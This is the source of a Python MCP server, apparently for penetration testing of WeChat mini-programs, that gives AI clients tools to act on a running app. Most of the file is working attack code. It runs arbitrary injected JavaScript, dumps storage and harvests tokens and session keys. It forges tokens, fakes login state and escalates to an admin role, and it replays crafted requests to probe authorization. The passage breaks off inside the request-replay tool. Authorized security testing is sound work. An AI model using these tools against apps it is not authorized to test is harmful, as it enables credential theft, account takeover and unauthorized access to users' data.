"""
mcp_server.py — WeChat 小程序渗透测试 MCP 服务器
依赖 First 调试框架 (https://github.com/Spade-sec/First) 已运行

使用方法:
    1. 先启动 First: sudo .venv/bin/python gui.py（或 cli.py）
    2. 打开微信小程序，Frida 注入成功后 CDP 代理就绪
    3. 启动本 MCP 服务器: .venv_mcp/bin/python mcp_server.py

MCP 配置 (Claude Desktop / Cursor / Copilot):
    {
      "mcpServers": {
        "miniapp-pentest": {
          "command": "/Users/hexin/vscode/First/.venv_mcp/bin/python",
          "args": ["/Users/hexin/vscode/First/mcp_server.py"],
          "env": {"PYTHONPATH": "/Users/hexin/vscode/First"}
        }
      }
    }
"""

import asyncio
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Optional

import websockets
from mcp.server.fastmcp import FastMCP

# ── 配置 ────────────────────────────────────────────────────────────────────
CDP_PORT = int(os.getenv("FIRST_CDP_PORT", "62000"))
CDP_URL = f"ws://127.0.0.1:{CDP_PORT}"
FIRST_DIR = Path(__file__).parent
OUTPUT_DIR = FIRST_DIR / "output"
SRC_DIR = FIRST_DIR / "src"

# ── FastMCP 实例 ─────────────────────────────────────────────────────────────
mcp = FastMCP(
    "miniapp-pentest",
    instructions=(
        "WeChat 小程序渗透测试工具集。连接到运行中的 First 调试框架，"
        "通过 CDP 协议与小程序交互，执行 JS 注入、路由枚举、存储读取、"
        "网络拦截、云函数 Hook、敏感信息扫描等安全测试操作。"
        "使用前请先调用 check_connection 确认连接状态。"
    ),
)

# ── CDP 工具函数 ──────────────────────────────────────────────────────────────
_cmd_counter = 0

# 持久 WebSocket 连接（避免每次工具调用都建立新连接）
_ws: Optional[websockets.WebSocketClientProtocol] = None
_ws_lock = asyncio.Lock()

# 查找包含 wx 的子 frame（AppService 逻辑层）
_FRAME_FIND = (
    "var _f=window;"
    "for(var _i=0;_i<(window.frames||[]).length;_i++){"
    "try{if(typeof window.frames[_i].wx!=='undefined'){_f=window.frames[_i];break}}catch(e){}}"
)


def _next_id() -> int:
    global _cmd_counter
    _cmd_counter += 1
    return _cmd_counter


def _in_frame(expr: str) -> str:
    """将 JS 表达式包裹在能访问 wx/getCurrentPages/getApp 的 frame 上下文里执行。"""
    return (
        "(function(){"
        + _FRAME_FIND
        + "var wx=_f.wx,"
        "getCurrentPages=_f.getCurrentPages||function(){return []},"
        "getApp=_f.getApp||function(){return null},"
        "__wxConfig=_f.__wxConfig||{};"
        "return " + expr + ";"
        "})()"
    )


def _in_frame_inject(code: str) -> str:
    """将 JS 代码字符串通过 frame.eval() 注入到 AppService frame 里执行。"""
    return (
        "(function(){"
        + _FRAME_FIND
        + "_f.eval(" + json.dumps(code) + ");"
        "})()"
    )


async def _cdp_call(
    method: str,
    params: Optional[dict] = None,
    timeout: float = 10.0,
) -> dict:
    """连接 CDP 代理，发送命令，等待对应 id 的响应。复用持久 WebSocket 连接。"""
    global _ws
    cmd_id = _next_id()
    payload = json.dumps({"id": cmd_id, "method": method, "params": params or {}})

    async with _ws_lock:
        try:
            if _ws is None or _ws.closed:
                if _ws is not None:
                    try:
                        await _ws.close()
                    except Exception:
                        pass
                _ws = await asyncio.wait_for(
                    websockets.connect(CDP_URL, max_size=64 * 1024 * 1024),
                    timeout=5,
                )

            await _ws.send(payload)
            deadline = time.monotonic() + timeout
            while True:
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                try:
                    raw = await asyncio.wait_for(_ws.recv(), timeout=remaining)
                except asyncio.TimeoutError:
                    break
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                if msg.get("id") == cmd_id:
                    return msg
        except (OSError, websockets.exceptions.WebSocketException) as e:
            _ws = None
            return {"error": f"CDP连接失败: {e}"}

    return {"error": "timeout: 未收到响应"}


async def _eval_js(expr: str, timeout: float = 10.0, await_promise: bool = False) -> Any:
    """在 CDP 顶层 window 上下文执行 JS，返回 Python 原生值或错误 dict。"""
    resp = await _cdp_call(
        "Runtime.evaluate",
        {"expression": expr, "returnByValue": True, "awaitPromise": await_promise},
        timeout=timeout,
    )
    if "error" in resp:
        return resp
    ex = resp.get("result", {}).get("exceptionDetails")
    if ex:
        desc = ex.get("exception", {}).get("description", "JS error")
        return {"error": desc}
    return resp.get("result", {}).get("result", {}).get("value")


async def _eval_in_frame(expr: str, timeout: float = 10.0, await_promise: bool = False) -> Any:
    """在含有 wx 的 AppService frame 上下文执行 JS 表达式。"""
    return await _eval_js(_in_frame(expr), timeout=timeout, await_promise=await_promise)


async def _inject_file(js_path: Path, timeout: float = 10.0) -> bool:
    """将本地 JS 文件注入到 AppService frame（使用 frame.eval）。"""
    try:
        code = js_path.read_text(encoding="utf-8")
    except Exception:
        return False
    result = await _eval_js(_in_frame_inject(code), timeout=timeout)
    return not (isinstance(result, dict) and "error" in result)


def _fmt(value: Any) -> str:
    """将 Python 值格式化为可读字符串。"""
    if isinstance(value, (dict, list)):
        return json.dumps(value, ensure_ascii=False, indent=2)
    if isinstance(value, dict) and "error" in value:
        return f"[错误] {value['error']}"
    return str(value) if value is not None else "null"


# ════════════════════════════════════════════════════════════════════════════
#  MCP 工具定义
# ════════════════════════════════════════════════════════════════════════════

@mcp.tool()
async def check_connection() -> str:
    """
    检查 First 调试框架是否运行，CDP 代理是否可用，小程序是否已连接。
    每次开始测试前必须先调用此工具确认连接状态。
    """
    result = await _eval_js("typeof wx !== 'undefined' ? 'ok' : 'no_wx'")
    if isinstance(result, dict) and "error" in result:
        return (
            "❌ 未连接到 First。\n"
            "请先:\n"
            "  1. 运行: sudo .venv/bin/python gui.py\n"
            "  2. 打开微信，找到目标小程序并进入\n"
            "  3. 等待 Frida 注入完成后重试\n"
            f"错误详情: {result['error']}"
        )
    appid_val = await _eval_js(
        "(function(){try{"
        "var c=window.__wxConfig||{};"
        "return c.appid||(c.accountInfo&&c.accountInfo.appid)||'unknown'"
        "}catch(e){return 'error: '+e.toString()}})()"
    )
    return (
        f"✅ CDP 连接正常，小程序已就绪\n"
        f"AppID: {appid_val}\n"
        f"CDP 地址: {CDP_URL}"
    )


@mcp.tool()
async def get_miniapp_info() -> str:
    """
    获取当前小程序的基本信息：AppID、名称、版本号、入口页面、所有页面列表。
    """
    val = await _eval_in_frame(
        "(function(){"
        "try{"
        "var c=__wxConfig||{};"
        "var ai=c.accountInfo||{};"
        "var pages=c.pages||c.page||[];"
        "if(!Array.isArray(pages))pages=Object.keys(pages);"
        "return JSON.stringify({"
        "  appid: ai.appid||c.appid||'',"
        "  name: ai.nickname||'',"
        "  version: c.appConfig&&c.appConfig.version||'',"
        "  sdkVersion: c.sdkVersion||'',"
        "  entry: c.entryPagePath||'',"
        "  pages: pages"
        "});"
        "}catch(e){return JSON.stringify({error:e.toString()})}"
        "})()"
    )
    if isinstance(val, dict) and "error" in val:
        return f"[错误] {val['error']}"
    try:
        info = json.loads(val) if isinstance(val, str) else val
        return json.dumps(info, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def get_all_routes() -> str:
    """
    枚举小程序的所有页面路由，包括 tabBar 和普通页面。
    返回完整路由列表，可用于 navigate_to_route 进行页面遍历测试。
    """
    nav_js = SRC_DIR / "nav_inject.js"
    await _inject_file(nav_js, timeout=12.0)

    val = await _eval_js(
        "JSON.stringify({"
        "pages: window.nav ? window.nav.allPages : [],"
        "tabBar: window.nav ? window.nav.tabBarPages : [],"
        "appid: window.nav && window.nav.config ? (window.nav.config.appid||'') : ''"
        "})",
        timeout=8.0,
    )
    if isinstance(val, dict) and "error" in val:
        # fallback: 从 AppService frame 的 __wxConfig 读取
        val = await _eval_in_frame(
            "(function(){"
            "try{"
            "var c=__wxConfig||{};"
            "var pages=c.pages||c.page||[];"
            "if(!Array.isArray(pages))pages=Object.keys(pages);"
            "return JSON.stringify({pages:pages,tabBar:[],appid:c.appid||''});"
            "}catch(e){return JSON.stringify({error:e.toString()})}"
            "})()"
        )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        pages = data.get("pages", [])
        tab = data.get("tabBar", [])
        lines = [f"AppID: {data.get('appid','')}", f"共 {len(pages)} 个页面:"]
        for p in pages:
            mark = " [tabBar]" if p in tab else ""
            lines.append(f"  - {p}{mark}")
        return "\n".join(lines)
    except Exception:
        return str(val)


@mcp.tool()
async def navigate_to_route(route: str) -> str:
    """
    导航到指定的小程序页面路由（不带前缀 /）。
    例如: pages/index/index 或 pages/user/profile
    tabBar 页面会自动使用 switchTab，其他页面使用 navigateTo。
    """
    nav_js = SRC_DIR / "nav_inject.js"
    await _inject_file(nav_js, timeout=12.0)
    safe = route.replace("'", "\\'")
    target = route.lstrip("/")
    await _eval_js(f"window.nav ? window.nav.goTo('{safe}') : 'nav_not_ready'")
    # 轮询等待页面切换完成，最多 3 秒
    _get_route_js = "(function(){try{var p=getCurrentPages();var c=p[p.length-1];return c.route||c.__route__||''}catch(e){return ''}})()"
    for _ in range(6):
        await asyncio.sleep(0.5)
        cur = await _eval_in_frame(_get_route_js)
        if cur and cur == target:
            return f"✅ 已导航到: {cur}"
    cur = await _eval_in_frame(_get_route_js)
    if cur and cur == target:
        return f"✅ 已导航到: {cur}"
    return f"导航指令已发送: {route}\n当前页面: {cur or '(无法读取)'}\n提示: 页面可能仍在加载中"


@mcp.tool()
async def get_current_page() -> str:
    """
    获取当前正在显示的小程序页面信息：路由、页面数据(data)、URL 参数。
    """
    val = await _eval_in_frame(
        "(function(){"
        "try{"
        "var pages=getCurrentPages();"
        "if(!pages||!pages.length)return JSON.stringify({error:'no pages'});"
        "var cur=pages[pages.length-1];"
        "return JSON.stringify({"
        "  route: cur.route||cur.__route__||'',"
        "  options: cur.options||{},"
        "  data: cur.data||{}"
        "});"
        "}catch(e){return JSON.stringify({error:e.toString()})}"
        "})()"
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def execute_js(expression: str) -> str:
    """
    在小程序的 JS 上下文中执行任意 JavaScript 代码（自动定位到 AppService frame）。
    可用于读取变量、调用 API、触发功能、绕过前端逻辑等。
    示例: wx.getStorageSync('token')
          JSON.stringify(getCurrentPages()[getCurrentPages().length-1].data)
    """
    val = await _eval_in_frame(expression, timeout=12.0)
    return _fmt(val)


@mcp.tool()
async def read_storage(key: str) -> str:
    """
    读取小程序本地存储中指定 key 的值 (wx.getStorageSync)。
    常用 key: token, openid, userInfo, sessionKey, uid, session, auth_token
    """
    safe = key.replace("'", "\\'")
    val = await _eval_in_frame(
        f"(function(){{try{{var v=wx.getStorageSync('{safe}');return JSON.stringify({{key:'{safe}',value:v}})}}"
        f"catch(e){{return JSON.stringify({{error:e.message}})}}}})()")
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def dump_all_storage() -> str:
    """
    导出小程序本地存储中所有键值对。
    可发现 token、sessionKey、openid、用户信息等敏感数据。
    """
    val = await _eval_in_frame(
        "(function(){"
        "try{"
        "var info=wx.getStorageInfoSync();"
        "var keys=info.keys||[];"
        "var result={};"
        "for(var i=0;i<keys.length;i++){"
        "  try{result[keys[i]]=wx.getStorageSync(keys[i])}catch(e){result[keys[i]]='[read error]'}"
        "}"
        "return JSON.stringify({keys:keys,data:result,currentSize:info.currentSize,limitSize:info.limitSize})"
        "}catch(e){return JSON.stringify({error:e.toString()})}"
        "})()"
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def get_user_credentials() -> str:
    """
    尝试从多个来源提取用户身份凭证：存储中的 token/openid/session，
    以及全局 app 对象中的认证信息。适合测试鉴权逻辑。
    """
    val = await _eval_in_frame(
        "(function(){"
        "var found={};"
        "var credKeys=['token','access_token','auth_token','session','sessionKey','sessionId',"
        "  'openid','uid','userId','user_id','userInfo','user','login_token','jwt','Authorization'];"
        "try{"
        "  var si=wx.getStorageInfoSync();"
        "  var all_keys=si.keys||[];"
        "  for(var i=0;i<all_keys.length;i++){"
        "    var k=all_keys[i].toLowerCase();"
        "    if(credKeys.some(function(c){return k.indexOf(c.toLowerCase())>=0})){"
        "      try{found[all_keys[i]]=wx.getStorageSync(all_keys[i])}catch(e){}"
        "    }"
        "  }"
        "}catch(e){}"
        "try{"
        "  var app=getApp();"
        "  if(app&&app.globalData){"
        "    var gd=app.globalData;"
        "    for(var key in gd){"
        "      var kl=key.toLowerCase();"
        "      if(credKeys.some(function(c){return kl.indexOf(c.toLowerCase())>=0})){"
        "        found['globalData.'+key]=gd[key]"
        "      }"
        "    }"
        "  }"
        "}catch(e){}"
        "return JSON.stringify(found)"
        "})()"
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        if not data:
            return "未发现明显的凭证相关存储项"
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def start_network_capture(capture_count: int = 50) -> str:
    """
    安装 wx.request Hook，开始捕获网络请求。
    capture_count: 最大捕获数（默认 50）
    注入后需在小程序中触发操作，再用 get_captured_requests 获取结果。
    页面跳转或小程序重载后 Hook 会失效，需要重新调用此工具重装。
    """
    limit = max(1, min(capture_count, 500))
    js = (
        "(function(){"
        "var existing=_f.__reqCapture||[];"
        "_f.__reqCapture=existing;"
        f"_f.__reqCaptureLimit={limit};"
        "_f.__origRequest=_f.__origRequest||wx.request;"
        "var orig=_f.__origRequest;"
        "wx.request=function(opts){"
        "  if(_f.__reqCapture.length<_f.__reqCaptureLimit){"
        "    _f.__reqCapture.push({"
        "      time: Date.now(),"
        "      url: opts.url||'',"
        "      method: (opts.method||'GET').toUpperCase(),"
        "      header: opts.header||{},"
        "      data: opts.data||null"
        "    });"
        "  }"
        "  return orig.apply(this,arguments);"
        "};"
        "var wasInstalled=!!_f.__reqHookInstalled;"
        "_f.__reqHookInstalled=true;"
        "return JSON.stringify({status:wasInstalled?'hook_reinstalled':'hook_installed',"
        "  message:'wx.request Hook '+(wasInstalled?'已重装':'已安装')+"
        "'，请在小程序中触发网络请求',existing_captured:existing.length})"
        "})()"
    )
    val = await _eval_in_frame(js)
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def get_captured_requests(clear: bool = True) -> str:
    """
    获取已捕获的网络请求列表。需要先调用 start_network_capture 安装 Hook。
    clear: 是否清空已捕获的记录（默认 True），设为 False 可保留记录继续捕获。
    """
    clear_js = "_f.__reqCapture=[];" if clear else ""
    js = (
        "(function(){"
        "if(!_f.__reqHookInstalled)return JSON.stringify({error:'Hook 未安装，请先调用 start_network_capture'});"
        "var result=_f.__reqCapture.slice();"
        + clear_js +
        "return JSON.stringify({count:result.length,requests:result})"
        "})()"
    )
    val = await _eval_in_frame(js)
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def set_request_headers(headers: str) -> str:
    """
    为后续所有网络请求注入自定义 HTTP 头。
    同时在 CDP Network 层和 wx.request JS 层注入，确保覆盖所有网络请求。
    参数 headers: JSON 字符串，例如 {"Authorization": "Bearer xxx", "X-Custom": "value"}
    可用于测试 header 注入、越权、Token 替换等。
    """
    try:
        headers_dict = json.loads(headers)
    except json.JSONDecodeError as e:
        return f"[错误] headers 必须是合法 JSON 字符串: {e}"

    results = []

    # CDP 层注入（对 WebView 发出的请求生效）
    resp1 = await _cdp_call("Network.enable")
    if "error" not in resp1:
        resp2 = await _cdp_call("Network.setExtraHTTPHeaders", {"headers": headers_dict})
        if "error" not in resp2:
            results.append("CDP Network 层: ✅")
        else:
            results.append(f"CDP Network 层: ❌ {resp2['error']}")
    else:
        results.append(f"CDP Network 层: ❌ {resp1['error']}")

    # JS 层注入（Hook wx.request，对小程序原生网络请求生效）
    headers_json = json.dumps(headers_dict)
    js = (
        "(function(){"
        f"var _extraHeaders={headers_json};"
        "var prev=wx.request;"
        "wx.request=function(opts){"
        "  opts.header=opts.header||{};"
        "  for(var k in _extraHeaders){opts.header[k]=_extraHeaders[k]}"
        "  return prev.apply(this,arguments);"
        "};"
        "return 'ok'"
        "})()"
    )
    val = await _eval_in_frame(js)
    if val == "ok":
        results.append("JS wx.request 层: ✅")
    else:
        results.append(f"JS wx.request 层: ❌ {val}")

    return f"已注入 {len(headers_dict)} 个请求头:\n" + "\n".join(
        f"  {k}: {v}" for k, v in headers_dict.items()
    ) + "\n\n注入状态:\n" + "\n".join(f"  {r}" for r in results)


@mcp.tool()
async def enable_cloud_function_hook() -> str:
    """
    注入云函数 Hook，监控小程序调用的所有云函数（wx.cloud.callFunction）。
    调用此工具后，在小程序中触发云函数，再调用 get_cloud_calls 获取捕获结果。
    """
    cloud_js = SRC_DIR / "cloud_audit_inject.js"
    ok = await _inject_file(cloud_js, timeout=15.0)
    if not ok:
        return "[错误] 注入 cloud_audit_inject.js 失败"
    # 通过 _in_frame 访问注入到 frame 里的 cloudAudit 对象
    val = await _eval_js(
        _in_frame(
            "JSON.stringify(_f.cloudAudit ? _f.cloudAudit.installHook() : {error:'cloudAudit not found'})"
        ),
        timeout=8.0,
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        if data.get("ok"):
            return "✅ 云函数 Hook 已安装，请在小程序中触发云函数调用"
        return f"Hook 安装结果: {json.dumps(data, ensure_ascii=False)}"
    except Exception:
        return str(val)


@mcp.tool()
async def get_cloud_calls() -> str:
    """
    获取已捕获的云函数调用记录（函数名、参数、调用时间）。
    需要先调用 enable_cloud_function_hook 安装 Hook。
    """
    val = await _eval_js(
        _in_frame(
            "(function(){"
            "try{"
            "  if(!_f.cloudAudit)return JSON.stringify({error:'Hook 未安装，请先调用 enable_cloud_function_hook'});"
            "  var calls=_f.cloudAudit.getHookedCalls();"
            "  return JSON.stringify({count:calls.length,calls:calls})"
            "}catch(e){return JSON.stringify({error:e.toString()})}"
            "})()"
        )
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        if not data.get("calls"):
            return "暂无云函数调用记录（Hook 已安装但尚未捕获到调用）"
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def call_cloud_function(name: str, data: str = "{}") -> str:
    """
    手动调用指定云函数，可自定义参数，测试云函数鉴权、越权、参数注入等漏洞。
    name: 云函数名称
    data: JSON 字符串格式的调用参数，例如 {"userId": "123", "action": "admin"}
    """
    try:
        data_obj = json.loads(data)
    except json.JSONDecodeError as e:
        return f"[错误] data 必须是合法 JSON 字符串: {e}"

    safe_name = name.replace("'", "\\'")
    data_str = json.dumps(data_obj)
    js = (
        f"(function(){{"
        "return new Promise(function(resolve){"
        "  wx.cloud.callFunction({"
        f"    name:'{safe_name}',"
        f"    data:{data_str},"
        "    success:function(r){resolve(JSON.stringify({ok:true,result:r.result,requestId:r.requestID}))},"
        "    fail:function(e){resolve(JSON.stringify({ok:false,error:e.errMsg}))}"
        "  })"
        "})"
        "})()"
    )
    val = await _eval_in_frame(js, timeout=20.0, await_promise=True)
    try:
        result = json.loads(val) if isinstance(val, str) else val
        return json.dumps(result, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def scan_sensitive_info(appid: str = "") -> str:
    """
    扫描已解包的小程序源码，查找敏感信息：API Key、JWT、IP 地址、OSS 配置、
    手机号、身份证号、邮箱、Secret Key 等。
    appid: 指定要扫描的小程序 AppID（空则扫描所有已解包的）。
    需要先通过 decompile_wxapkg 或 First GUI 解包小程序到 output/ 目录。
    """
    if not OUTPUT_DIR.exists():
        return f"[错误] output 目录不存在: {OUTPUT_DIR}"

    sys.path.insert(0, str(FIRST_DIR))
    try:
        from src.extractor import Extractor
    except ImportError as e:
        return f"[错误] 无法导入 Extractor: {e}"

    if appid:
        scan_dirs = [OUTPUT_DIR / appid] if (OUTPUT_DIR / appid).exists() else []
        if not scan_dirs:
            return f"[错误] 未找到 AppID '{appid}' 的解包目录: {OUTPUT_DIR / appid}"
    else:
        scan_dirs = [d for d in OUTPUT_DIR.iterdir() if d.is_dir()]

    if not scan_dirs:
        available = [d.name for d in OUTPUT_DIR.iterdir() if d.is_dir()]
        return (
            f"[错误] output/ 目录中没有解包的小程序\n"
            f"请先在 First GUI 中解包目标小程序\n"
            f"已有目录: {available}"
        )

    ext = Extractor()
    all_results = {}
    for scan_dir in scan_dirs:
        results = ext.scan_directory(str(scan_dir))
        all_results[scan_dir.name] = results

    # 汇总输出（scan_directory 返回 {files_scanned, elapsed, results: {cat: [...]}, custom_results}）
    summary_lines = []
    for appid_name, scan_result in all_results.items():
        summary_lines.append(f"\n=== {appid_name} ===")
        total = 0
        cat_results = scan_result.get("results", {})
        for category, items in cat_results.items():
            if items:
                summary_lines.append(f"  [{category}] {len(items)} 条:")
                for item in items[:5]:
                    summary_lines.append(f"    {item}")
                if len(items) > 5:
                    summary_lines.append(f"    ... 共 {len(items)} 条")
                total += len(items)
        # 自定义正则结果
        for cname, citems in scan_result.get("custom_results", {}).items():
            if citems:
                summary_lines.append(f"  [custom:{cname}] {len(citems)} 条:")
                for item in citems[:3]:
                    summary_lines.append(f"    {item}")
                total += len(citems)
        summary_lines.append(f"  文件数: {scan_result.get('files_scanned',0)} | 耗时: {scan_result.get('elapsed',0):.2f}s")
        if total == 0:
            summary_lines.append("  未发现敏感信息")
        else:
            summary_lines.append(f"  合计: {total} 条敏感信息")

    return "\n".join(summary_lines)


@mcp.tool()
async def list_decompiled_apps() -> str:
    """
    列出 output/ 目录中已解包的小程序，显示 AppID 和文件统计。
    """
    if not OUTPUT_DIR.exists():
        return f"output/ 目录不存在: {OUTPUT_DIR}"
    dirs = [d for d in OUTPUT_DIR.iterdir() if d.is_dir()]
    if not dirs:
        return "output/ 目录为空，尚无已解包的小程序"
    lines = [f"已解包的小程序 ({len(dirs)} 个):"]
    for d in sorted(dirs):
        js_files = list(d.rglob("*.js"))
        lines.append(f"  {d.name} — {len(js_files)} 个 JS 文件")
    return "\n".join(lines)


@mcp.tool()
async def find_api_endpoints(appid: str = "") -> str:
    """
    从已解包的小程序 JS 源码中提取所有 API 接口地址（URL 和域名）。
    appid: 指定 AppID，空则分析第一个找到的已解包小程序。
    """
    if not OUTPUT_DIR.exists():
        return f"[错误] output/ 目录不存在"

    if appid:
        target = OUTPUT_DIR / appid
    else:
        dirs = [d for d in OUTPUT_DIR.iterdir() if d.is_dir()]
        if not dirs:
            return "[错误] 没有已解包的小程序"
        target = sorted(dirs)[0]

    if not target.exists():
        return f"[错误] 目录不存在: {target}"

    import re
    url_pattern = re.compile(
        r'["\']((https?://[a-zA-Z0-9\-\.]+(?::\d+)?(?:/[^\s"\'<>]*)?))["\']'
    )
    api_path_pattern = re.compile(
        r'["\'](/(?:api|v[0-9]|rest|graphql|rpc)/[a-zA-Z0-9\-_/]+(?:\.[a-zA-Z0-9]+)?)["\']'
    )
    api_pattern = re.compile(
        r'(?:^|[\s,{(;])(?:url|baseUrl|apiUrl|host|server|endpoint|baseAPI)\s*[=:]\s*["\']([^"\']{8,120})["\']',
        re.IGNORECASE | re.MULTILINE,
    )

    found_urls = set()
    found_paths = set()
    found_api = set()
    for js_file in target.rglob("*.js"):
        try:
            content = js_file.read_text(encoding="utf-8", errors="ignore")
            for m in url_pattern.findall(content):
                url = m[0]
                if len(url) > 10:
                    found_urls.add(url)
            for m in api_path_pattern.findall(content):
                if len(m) > 3:
                    found_paths.add(m)
            for m in api_pattern.findall(content):
                if len(m) > 5:
                    found_api.add(m)
        except Exception:
            continue

    lines = [f"目标: {target.name}"]
    lines.append(f"\n=== HTTP(S) URLs ({len(found_urls)} 个) ===")
    for url in sorted(found_urls)[:100]:
        lines.append(f"  {url}")
    lines.append(f"\n=== API 路径 ({len(found_paths)} 个) ===")
    for p in sorted(found_paths)[:50]:
        lines.append(f"  {p}")
    lines.append(f"\n=== API 配置变量 ({len(found_api)} 个) ===")
    for api in sorted(found_api)[:50]:
        lines.append(f"  {api}")
    return "\n".join(lines)


@mcp.tool()
async def inject_hook_script(script: str) -> str:
    """
    向小程序注入自定义 JS Hook 脚本（完整的 JS 代码字符串）。
    可用于 Hook 任意函数、替换全局变量、绕过鉴权检查等高级操作。
    脚本在小程序全局作用域中执行，window 对象可用。
    示例: '(function(){ var orig = wx.login; wx.login = function(opts){ console.log("login called", opts); return orig.apply(this, arguments); }; })()'
    """
    val = await _eval_js(script, timeout=15.0)
    return f"脚本执行结果:\n{_fmt(val)}"


@mcp.tool()
async def get_app_global_data() -> str:
    """
    获取小程序 App 对象中的 globalData，通常包含用户信息、登录状态、配置等。
    """
    val = await _eval_in_frame(
        "(function(){"
        "try{"
        "  var app=getApp();"
        "  if(!app)return JSON.stringify({error:'getApp() returned null'});"
        "  return JSON.stringify({"
        "    globalData: app.globalData||{},"
        "    hasUserInfo: !!(app.globalData&&app.globalData.userInfo)"
        "  })"
        "}catch(e){return JSON.stringify({error:e.toString()})}"
        "})()"
    )
    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def bypass_auth_check(method: str = "token_spoof") -> str:
    """
    尝试常见的小程序鉴权绕过手法。
    method 可选:
      - token_spoof: 查找并伪造 storage 中的 token（替换部分字符）
      - admin_role: 尝试在 globalData 中提升用户角色
      - skip_login: 绕过登录态检查（设置 isLogin=true）
      - dump_login_logic: 仅列出当前鉴权相关变量（不修改）
    """
    if method == "dump_login_logic":
        val = await _eval_in_frame(
            "(function(){"
            "var result={};"
            "try{var app=getApp();result.globalData=app&&app.globalData}catch(e){}"
            "try{"
            "  var si=wx.getStorageInfoSync();"
            "  var authKeys=si.keys.filter(function(k){"
            "    var kl=k.toLowerCase();"
            "    return ['token','auth','login','session','user','role','admin','perm'].some("
            "      function(c){return kl.indexOf(c)>=0});"
            "  });"
            "  result.authStorage={};"
            "  authKeys.forEach(function(k){"
            "    try{result.authStorage[k]=wx.getStorageSync(k)}catch(e){}"
            "  });"
            "}catch(e){}"
            "return JSON.stringify(result)"
            "})()"
        )
    elif method == "skip_login":
        val = await _eval_in_frame(
            "(function(){"
            "try{"
            "  wx.setStorageSync('isLogin', true);"
            "  wx.setStorageSync('isLoggedIn', true);"
            "  var app=getApp();"
            "  if(app&&app.globalData){"
            "    app.globalData.isLogin=true;"
            "    app.globalData.isLoggedIn=true;"
            "    app.globalData.loginState=1;"
            "  }"
            "  return JSON.stringify({ok:true,msg:'已设置 isLogin=true'})"
            "}catch(e){return JSON.stringify({error:e.toString()})}"
            "})()"
        )
    elif method == "admin_role":
        val = await _eval_in_frame(
            "(function(){"
            "try{"
            "  var app=getApp();"
            "  if(app&&app.globalData){"
            "    var gd=app.globalData;"
            "    if(gd.userInfo){gd.userInfo.role='admin';gd.userInfo.isAdmin=true;}"
            "    gd.role='admin';gd.isAdmin=true;"
            "  }"
            "  wx.setStorageSync('role','admin');"
            "  wx.setStorageSync('isAdmin',true);"
            "  return JSON.stringify({ok:true,msg:'已尝试设置 admin 角色'})"
            "}catch(e){return JSON.stringify({error:e.toString()})}"
            "})()"
        )
    elif method == "token_spoof":
        val = await _eval_in_frame(
            "(function(){"
            "try{"
            "  var tokenKeys=['token','access_token','auth_token','login_token','jwt','session','sessionKey'];"
            "  var si=wx.getStorageInfoSync();"
            "  var found={};"
            "  for(var i=0;i<si.keys.length;i++){"
            "    var k=si.keys[i];"
            "    if(tokenKeys.some(function(t){return k.toLowerCase().indexOf(t)>=0})){"
            "      found[k]=wx.getStorageSync(k)"
            "    }"
            "  }"
            "  if(Object.keys(found).length===0){"
            "    return JSON.stringify({ok:false,msg:'未找到 token 相关存储项',hint:'可使用 execute_js 手动写入: wx.setStorageSync(key, value)'})"
            "  }"
            "  var spoofed={};"
            "  for(var key in found){"
            "    var orig=found[key];"
            "    if(typeof orig==='string'&&orig.length>10){"
            "      var fake=orig.replace(/[a-f0-9]{8}/i,'deadbeef');"
            "      wx.setStorageSync(key, fake);"
            "      spoofed[key]={original:orig,spoofed:fake}"
            "    }else{"
            "      spoofed[key]={original:orig,skipped:'值太短或非字符串，未修改'}"
            "    }"
            "  }"
            "  return JSON.stringify({ok:true,msg:'已伪造 token',spoofed:spoofed})"
            "}catch(e){return JSON.stringify({error:e.toString()})}"
            "})()"
        )
    else:
        return f"[错误] 未知方法: {method}。可选: token_spoof, admin_role, skip_login, dump_login_logic"

    try:
        data = json.loads(val) if isinstance(val, str) else val
        return json.dumps(data, ensure_ascii=False, indent=2)
    except Exception:
        return str(val)


@mcp.tool()
async def replay_request(url: str, method: str = "GET", headers: str = "{}", body: str = "{}") -> str:
    """
    通过小程序上下文重放/构造 HTTP 请求，支持自定义 URL、方法、请求头和请求体。
    适用于测试越权、参数篡改、接口未授权访问等场景。
    url: 完整的请求 URL
    method: HTTP 方法（GET/POST/PUT/DELETE 等）
    headers: JSON 字符串格式的请求头
    body: JSON 字符串格式的请求体（仅 POST/PUT 等需要）
    """
    try:
        headers_dict = json.loads(headers) if headers else {}
    except json.JSONDecodeError as e:
        return f"[错误] headers 不是合法 JSON: {e}"
    try:
        body_obj = json.loads(body) if body and body != "{}" else {}
    except json.JSONDecodeError as e:
        return f"[错误] body 不是合法 JSON: {e}"

    safe_url = url.replace("'", "\\'")
    method_upper = method.upper()
    headers_json = json.dumps(headers_dict)
    body_json = json.dumps(body_obj)

    js = (
        "(function(){"
        "return new Promise(function(resolve){"
        "  wx.request({"
        f"    url:'{safe_url}',"
        f"    method:'{method_upper}',"
        f"    header:{headers_json},"
        f"    data:{body_json},"
        "    success:function(res){"
        "      resolve(JSON.stringify({"
        "        ok:true,"
